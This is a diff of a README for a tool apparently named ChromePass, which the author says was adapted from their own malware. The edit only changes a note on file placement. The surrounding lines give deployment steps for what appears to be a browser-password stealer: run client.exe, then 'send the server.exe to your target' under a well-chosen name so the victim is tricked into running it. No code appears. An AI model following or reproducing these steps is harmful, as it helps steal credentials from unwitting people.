@@ -52,7 +52,7 @@ PS: This was originally part of one of my malwares so I had to adjust. I didn't 
 	To find this ip open up CMD and type "ipconfig"
 	
 	4. Start the client.exe 
-	(I recommend having the client in a directory in "C:\", like "C:\ChromePass\client.exe")
+	(I recommend having the client, alongside all other files in a directory in "C:\", like "C:\ChromePass\[all_files]")
 	
 	5. Send the server.exe to your target 
 	(choosing an appropriate name is always important)
@@ -74,6 +74,7 @@ PS: This was originally part of one of my malwares so I had to adjust. I didn't 
 	(look up how to do that if you don't know)
 	
 	5. Start the client.exe
+	(I recommend having the client, alongside all other files in a directory in "C:\", like "C:\ChromePass\[all_files]")
 	
 	6. Send the server.exe to your target 
 	(choosing an appopriate name is always important)
